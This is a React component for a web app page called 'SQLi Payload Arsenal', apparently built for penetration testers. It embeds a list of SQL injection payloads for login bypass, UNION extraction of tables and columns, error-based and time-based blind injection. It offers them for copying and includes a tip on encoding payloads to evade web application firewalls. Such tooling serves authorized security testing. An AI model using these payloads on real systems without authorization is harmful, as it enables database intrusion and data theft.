import { useState, useMemo } from 'react';
import { 
  HiOutlineLightningBolt, HiOutlineClipboardCopy, HiOutlineFilter, 
  HiOutlineCheck, HiOutlineSearch, HiOutlineDatabase 
} from 'react-icons/hi';
import toast from 'react-hot-toast';

const SQLI_DATA = [
  {
    id: 'auth',
    name: 'Auth Bypass',
    db: 'All',
    payloads: [
      { code: "' OR 1=1--", desc: 'Classic OR 1=1' },
      { code: "admin'--", desc: 'Comment out password' },
      { code: "' OR '1'='1", desc: 'String comparison bypass' },
      { code: "admin' #", desc: 'MySQL comment bypass' },
      { code: "admin'/*", desc: 'Multi-line comment bypass' },
      { code: "' or 1=1 LIMIT 1--", desc: 'Limit to first record' },
      { code: "' OR TRUE--", desc: 'Boolean bypass' },
      { code: "' OR 1=1#", desc: 'MySQL hash comment' },
    ]
  },
  {
    id: 'union',
    name: 'Union Based',
    db: 'MySQL/PG',
    payloads: [
      { code: "UNION SELECT 1,2,3--", desc: 'Simple UNION SELECT' },
      { code: "' UNION SELECT NULL,NULL,NULL--", desc: 'NULL-based UNION' },
      { code: "' UNION SELECT @@version,user(),database()--", desc: 'MySQL fingerprinting' },
      { code: "UNION ALL SELECT table_name,NULL FROM information_schema.tables--", desc: 'Extract table names' },
      { code: "' UNION SELECT 1,group_concat(column_name) FROM information_schema.columns--", desc: 'MySQL column extraction' },
    ]
  },
  {
    id: 'error',
    name: 'Error Based',
    db: 'MSSQL/Oracle',
    payloads: [
      { code: "AND 1=(SELECT COUNT(*) FROM information_schema.tables)", desc: 'Subquery error' },
      { code: "AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT USER()), 0x7e))", desc: 'MySQL XPath error' },
      { code: "CONVERT(int, (SELECT @@version))", desc: 'MSSQL conversion error' },
      { code: "ctxsys.drithsx.sn(1,(select user from dual))", desc: 'Oracle DRITHSX error' },
    ]
  },
  {
    id: 'blind',
    name: 'Time Based',
    db: 'All',
    payloads: [
      { code: "AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)", desc: 'MySQL Sleep' },
      { code: "'; WAITFOR DELAY '0:0:5'--", desc: 'MSSQL WaitFor' },
      { code: "AND 1=IF(SUBSTR(DATABASE(),1,1)='a', SLEEP(5), 1)", desc: 'MySQL conditional sleep' },
      { code: "pg_sleep(5)--", desc: 'PostgreSQL sleep' },
    ]
  }
];

export default function SqliGenerator() {
  const [activeCategory, setActiveCategory] = useState('auth');
  const [search, setSearch] = useState('');
  const [dbFilter, setDbFilter] = useState('All');
  const [copiedId, setCopiedId] = useState(null);

  const filteredPayloads = useMemo(() => {
    const cat = SQLI_DATA.find(c => c.id === activeCategory);
    let items = cat.payloads;
    if (dbFilter !== 'All') {
      items = items.filter(p => cat.db.includes(dbFilter) || cat.db === 'All');
    }
    if (search) {
      items = items.filter(p => 
        p.code.toLowerCase().includes(search.toLowerCase()) || 
        p.desc.toLowerCase().includes(search.toLowerCase())
      );
    }
    return items;
  }, [activeCategory, search, dbFilter]);

  const copy = (text, id) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    toast.success('Payload copied!');
    setTimeout(() => setCopiedId(null), 2000);
  };

  return (
    <div className="max-w-5xl mx-auto space-y-6 animate-fade-in">
      {/* Header */}
      <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="flex items-center gap-4">
          <div className="w-12 h-12 rounded-xl bg-gradient-brand flex items-center justify-center shadow-glow-sm">
            <HiOutlineLightningBolt className="w-6 h-6 text-white" />
          </div>
          <div>
            <h1 className="text-xl font-bold" style={{ color: 'var(--color-text)' }}>SQLi Payload Arsenal</h1>
            <p className="text-xs" style={{ color: 'var(--color-text-secondary)' }}>Expert-curated injection vectors for professional auditing</p>
          </div>
        </div>
      </div>

      {/* Search & Filters */}
      <div className="glass-card p-4 flex flex-col md:flex-row gap-4">
        <div className="relative flex-1">
          <HiOutlineSearch className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 opacity-40" />
          <input 
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search payloads..." 
            className="input-field pl-10 py-2 text-xs" 
          />
        </div>
        <div className="flex items-center gap-2">
          <HiOutlineDatabase className="w-4 h-4 opacity-40" />
          <select 
            value={dbFilter}
            onChange={e => setDbFilter(e.target.value)}
            className="bg-transparent text-[11px] font-bold outline-none cursor-pointer hover:text-brand-500 transition-colors"
          >
            {['All', 'MySQL', 'PostgreSQL', 'MSSQL', 'Oracle'].map(db => (
              <option key={db} value={db} className="bg-surface-800">{db} Only</option>
            ))}
          </select>
        </div>
      </div>

      {/* Tabs */}
      <div className="flex items-center gap-2 overflow-x-auto pb-2 no-scrollbar">
        {SQLI_DATA.map(cat => (
          <button
            key={cat.id}
            onClick={() => setActiveCategory(cat.id)}
            className={`px-4 py-2 rounded-xl text-[11px] font-bold transition-all whitespace-nowrap border ${
              activeCategory === cat.id 
              ? 'bg-brand-500 text-white border-brand-500 shadow-glow-sm' 
              : 'bg-surface-100 dark:bg-surface-900 text-surface-500 border-border hover:border-brand-500/50'
            }`}
          >
            {cat.name}
          </button>
        ))}
      </div>

      {/* Payload Grid */}
      <div className="grid grid-cols-1 gap-3">
        {filteredPayloads.map((p, i) => (
          <div key={i} className="glass-card p-4 group hover:border-brand-500/30 transition-all flex flex-col gap-3">
            <div className="flex items-center justify-between">
              <span className="text-[10px] font-bold text-brand-500 opacity-60 uppercase tracking-widest">{p.desc}</span>
              <button 
                onClick={() => copy(p.code, i)}
                className="p-1.5 rounded-lg bg-surface-50 dark:bg-surface-800 text-surface-400 hover:text-brand-500 transition-colors"
              >
                {copiedId === i ? <HiOutlineCheck className="w-4 h-4 text-emerald-500" /> : <HiOutlineClipboardCopy className="w-4 h-4" />}
              </button>
            </div>
            <pre className="p-3 bg-black/40 rounded border border-border text-xs font-mono text-amber-500 break-all whitespace-pre-wrap">
              {p.code}
            </pre>
          </div>
        ))}
        {filteredPayloads.length === 0 && (
          <div className="py-20 text-center opacity-30 italic text-sm">No payloads match your filters</div>
        )}
      </div>

      <div className="glass-card p-4 border-l-4 border-l-amber-500 bg-amber-500/5">
        <div className="flex items-center gap-3 mb-1">
          <HiOutlineFilter className="text-amber-500 w-4 h-4" />
          <h4 className="text-[10px] font-bold uppercase tracking-wider">Bug Bounty Pro Tip</h4>
        </div>
        <p className="text-[10px] opacity-60 leading-relaxed">
          Always try multiple encoding variants (URL, Hex, Base64) to bypass modern WAFs. 
          Use time-based payloads if the application doesn't return verbose errors.
        </p>
      </div>
    </div>
  );
}
